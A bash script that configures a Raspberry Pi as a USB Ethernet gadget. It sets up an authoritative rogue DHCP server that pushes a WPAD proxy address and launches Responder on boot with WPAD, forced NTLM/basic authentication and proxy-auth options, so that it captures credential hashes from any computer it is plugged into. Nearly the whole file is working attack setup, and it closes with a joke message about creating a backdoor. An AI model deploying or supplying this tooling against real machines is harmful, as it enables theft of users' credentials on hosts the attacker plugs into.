#!/bin/bash

echo "[+] Enabling Mirco-Usb Ethernet..."

echo "dtoverlay=dwc2" >> /boot/config.txt
sed -i 's/$/ modules-load=dwc2,g_ether/g' /boot/cmdline.txt

echo "[+] Installing tools and dependencies..."

apt-get install -y python git python-pip python-dev screen sqlite3 isc-dhcp-server python-crypto inotify-tools
git clone https://github.com/lgandx/Responder.git /root/Responder

echo "[+] Modifying Network interfaces..."

sed -i 's/iface eth0 inet manual//g' /etc/network/interfaces
echo "
auto eth0
allow-hotplug eth0
iface eth0 inet static
    address 192.168.100.201
    netmask 255.255.255.0
    gateway 192.168.100.1
" >> /etc/network/interfaces

echo "[+] Enabling DHCP on network adapter..."

mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bkp
echo '' > /etc/dhcp/dhcpd.conf
echo 'ddns-update-style none;
option domain-name "domain.local";
option domain-name-servers 192.168.100.201;
default-lease-time 60;
max-lease-time 72;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 192.168.100.0 netmask 255.255.255.0 {
  range 192.168.100.1 192.168.100.2;
  option routers 192.168.100.201;
  option local-proxy-config "http://192.168.100.201/wpad.dat";
}' > /etc/dhcp/dhcpd.conf

echo "[+] Enabling Responder on boot..."

sed -i 's/exit 0//g' /etc/rc.local
echo "## Clear leases
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

# Start DHCP server
/usr/sbin/dhcpd

# Start Responder
/usr/bin/screen -dmS responder bash -c 'cd /root/Responder/; python Responder.py -I eth0 -f -w -r -d -F -P'

exit 0
" >> /etc/rc.local

echo "[+] Enabling logging of tasks in /root/logs/..."

mkdir /root/logs
echo "
#Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
" > /root/.screenrc

echo "[!!!] Creating Backdoor on your comupter..."
sleep 5
echo "[!!!] LOL...just kidding...you are good to go!"
